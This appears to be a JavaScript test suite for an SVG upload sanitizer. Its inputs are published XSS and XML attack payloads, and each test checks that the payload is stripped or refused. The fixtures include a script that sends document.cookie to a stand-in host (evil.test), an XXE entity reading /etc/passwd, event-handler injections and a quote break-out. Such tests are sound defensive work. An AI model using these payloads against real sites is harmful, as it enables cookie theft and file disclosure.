// tests/sanitizeSvg.test.js
//
// An uploaded SVG is an XML document a browser will execute, so these are
// written as attacks, not as feature checks: each one is a real, published
// way of getting script into an SVG that passed a naive filter. The bar is
// that the sanitizer either strips the payload or refuses the file --
// never that it "looks cleaned".
const test = require('node:test');
const assert = require('node:assert/strict');
const { sanitizeSvg } = require('../utils/sanitizeSvg');

// Nothing that survives sanitization may contain any of these, whatever
// route it arrived by.
const assertInert = (svg) => {
  // Checked against the markup with quoted attribute VALUES blanked out.
  // A value is escaped by the time it gets here, so text inside one is
  // inert data -- `fill="red&quot; onload=&quot;alert(1)"` renders a colour,
  // it does not run anything. What must not survive is a handler in
  // attribute-NAME position, and that is precisely what this leaves visible.
  const markup = svg.replace(/=\s*"[^"]*"/g, '=""').replace(/=\s*'[^']*'/g, "=''");
  assert.ok(!/<\s*script/i.test(markup), 'a script element survived');
  assert.ok(!/\son[a-z]+\s*=/i.test(markup), 'an event handler attribute survived');
  assert.ok(!/javascript\s*:/i.test(markup), 'a javascript: URL survived');
  assert.ok(!/<\s*foreignObject/i.test(markup), 'a foreignObject survived');

  // Separately: every value really is escaped, so the blanking above is
  // sound rather than a way of hiding a break-out. A raw < or > inside a
  // quoted value would mean a value could become markup.
  for (const value of svg.matchAll(/=\s*"([^"]*)"/g)) {
    assert.ok(!/[<>]/.test(value[1]), `an unescaped angle bracket survived in a value: ${value[1]}`);
  }

  // The SVG/xlink namespace URIs are declarations, not fetches -- they are
  // the one http:// that legitimately belongs in the output.
  const withoutNamespaces = svg.replace(/https?:\/\/www\.w3\.org\/[^"']*/gi, '');
  assert.ok(!/https?:\/\//i.test(withoutNamespaces), 'an external URL survived');
};

test('an ordinary drawing is accepted and its geometry is preserved', () => {
  const result = sanitizeSvg(
    '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">'
    + '<rect x="10" y="10" width="50" height="30" fill="#336699"/>'
    + '<text x="20" y="60" font-size="12">Certificate</text></svg>'
  );
  assert.equal(result.ok, true, result.reason);
  assert.match(result.svg, /<rect[^>]*width="50"/);
  assert.match(result.svg, /Certificate/);
  assert.match(result.svg, /fill="#336699"/);
});

test('a script element and its contents are removed', () => {
  const result = sanitizeSvg(
    '<svg xmlns="http://www.w3.org/2000/svg"><script>fetch("https://evil.test/"+document.cookie)</script><rect width="10" height="10"/></svg>'
  );
  assert.equal(result.ok, true, result.reason);
  assertInert(result.svg);
  assert.ok(!result.svg.includes('evil.test'), 'the script body was left behind as text');
  assert.match(result.svg, /<rect/, 'the legitimate content should survive');
});

test('event handler attributes are stripped from every element', () => {
  for (const payload of [
    '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><rect width="1" height="1"/></svg>',
    '<svg xmlns="http://www.w3.org/2000/svg"><rect width="1" height="1" onclick="alert(1)"/></svg>',
    '<svg xmlns="http://www.w3.org/2000/svg"><rect width="1" height="1" ONMOUSEOVER="alert(1)"/></svg>',
  ]) {
    const result = sanitizeSvg(payload);
    assert.equal(result.ok, true, result.reason);
    assertInert(result.svg);
  }
});

test('foreignObject, the HTML escape hatch, is removed with its contents', () => {
  const result = sanitizeSvg(
    '<svg xmlns="http://www.w3.org/2000/svg"><foreignObject width="100" height="100">'
    + '<body xmlns="http://www.w3.org/1999/xhtml"><img src=x onerror="alert(1)"/></body>'
    + '</foreignObject><circle r="5"/></svg>'
  );
  assert.equal(result.ok, true, result.reason);
  assertInert(result.svg);
  assert.ok(!/alert/i.test(result.svg));
});

test('an anchor with a javascript: href cannot survive', () => {
  const result = sanitizeSvg(
    '<svg xmlns="http://www.w3.org/2000/svg"><a xlink:href="javascript:alert(1)"><rect width="9" height="9"/></a></svg>'
  );
  // Either refused outright or stripped -- both are correct outcomes; what
  // matters is that no javascript: URL is ever in the output.
  if (result.ok) assertInert(result.svg);
});

test('DOCTYPE and ENTITY declarations are refused, not cleaned (XXE, billion laughs)', () => {
  const xxe = sanitizeSvg(
    '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
    + '<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>'
  );
  assert.equal(xxe.ok, false);
  assert.match(xxe.reason, /entity|doctype/i);

  const billionLaughs = sanitizeSvg(
    '<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;">]>'
    + '<svg xmlns="http://www.w3.org/2000/svg"><text>&lol2;</text></svg>'
  );
  assert.equal(billionLaughs.ok, false);
});

test('a CDATA section cannot be used to smuggle a payload past the tag filter', () => {
  const result = sanitizeSvg(
    '<svg xmlns="http://www.w3.org/2000/svg"><style><![CDATA[ * { background: url("https://evil.test/x") } ]]></style></svg>'
  );
  assert.equal(result.ok, false);
  assert.match(result.reason, /cdata/i);
});

test('external references are stripped -- an SVG must not phone home', () => {
  const result = sanitizeSvg(
    '<svg xmlns="http://www.w3.org/2000/svg">'
    + '<image href="https://evil.test/track.png" width="10" height="10"/>'
    + '<rect width="10" height="10" fill="url(https://evil.test/p)"/>'
    + '</svg>'
  );
  assert.equal(result.ok, true, result.reason);
  assertInert(result.svg);
  assert.ok(!result.svg.includes('evil.test'));
});

test('a same-document fragment reference is kept -- gradients must keep working', () => {
  const result = sanitizeSvg(
    '<svg xmlns="http://www.w3.org/2000/svg">'
    + '<defs><linearGradient id="g"><stop offset="0" stop-color="#fff"/></linearGradient></defs>'
    + '<rect width="10" height="10" fill="url(#g)"/></svg>'
  );
  assert.equal(result.ok, true, result.reason);
  assert.match(result.svg, /fill="url\(#g\)"/, 'a legitimate local gradient reference was destroyed');
  assert.match(result.svg, /linearGradient/i);
});

test('an inline base64 raster is kept -- it fetches nothing', () => {
  const pixel = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==';
  const result = sanitizeSvg(`<svg xmlns="http://www.w3.org/2000/svg"><image href="${pixel}" width="1" height="1"/></svg>`);
  assert.equal(result.ok, true, result.reason);
  assert.ok(result.svg.includes('data:image/png;base64,'));
});

test('a file that is not an SVG at all is refused', () => {
  assert.equal(sanitizeSvg('<html><body>hello</body></html>').ok, false);
  assert.equal(sanitizeSvg('').ok, false);
  assert.equal(sanitizeSvg('just some text').ok, false);
});

test('a NUL byte means this is not the text document it claims to be', () => {
  const result = sanitizeSvg('<svg xmlns="http://www.w3.org/2000/svg">\0<rect/></svg>');
  assert.equal(result.ok, false);
});

test('what was removed is reported, so a stripped file is never silently different', () => {
  const result = sanitizeSvg(
    '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><script>x</script><rect width="1" height="1"/></svg>'
  );
  assert.equal(result.ok, true, result.reason);
  assert.ok(result.removed.length >= 2, 'both the handler and the script should be reported');
});

test('an attribute value cannot break out of its own quoting and become markup', () => {
  const result = sanitizeSvg(
    '<svg xmlns="http://www.w3.org/2000/svg"><rect width=\'1\' height=\'1\' fill=\'red" onload="alert(1)\'/></svg>'
  );
  assert.equal(result.ok, true, result.reason);
  assertInert(result.svg);
  // The payload survives only as escaped TEXT inside the fill value -- the
  // quote that was meant to close it early is now &quot;, so it can never
  // start a new attribute.
  assert.ok(!/onload\s*=\s*"/.test(result.svg), 'the break-out produced a real handler');
  assert.match(result.svg, /&quot;/, 'the injected quote should have been escaped, not dropped');
});
